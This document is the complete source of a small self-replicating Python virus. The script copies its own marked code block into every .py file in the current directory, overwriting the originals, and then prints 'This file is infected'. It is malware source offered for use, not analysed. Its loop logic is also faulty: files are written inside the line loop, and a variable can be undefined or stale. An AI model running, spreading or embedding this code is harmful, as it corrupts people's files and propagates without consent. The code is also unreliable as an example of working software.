# starting virus code 
import sys, re, glob

viruscode = []

# open this files and read all lines

thisfile = sys.argv[0]
virusfile = open(thisfile, "r")
lines  = virusfile.readlines()
virusfile.close()

invirus = False

for line in lines:
    if(re.search("^# starting virus code ", line)):
        invirus = True
    
    if(invirus == True):
        viruscode.append(line)
    if(re.search("^# end of virus", line)):
        break

# find potential victms
 
programs = glob.glob("*.py")

# check and infect all programs

for p in programs:
    file = open(p, "r")
    programcode = file.readlines()
    file.close()

    # check if the file is already infected
    infected = False
    for line in programcode:
        if(re.search("^# starting virus code ", line)):
            infected = True
            break
        # We will stop because its already infected

        if not infected:
            newcode = []
            # original file + virus
            newcode = programcode
            newcode.extend(viruscode)
        # write new version of the file, overwrite the original

        file = open(p, "w")
        file.writelines(newcode)
        file.close()
        
print("This file is infected") 

# end of virus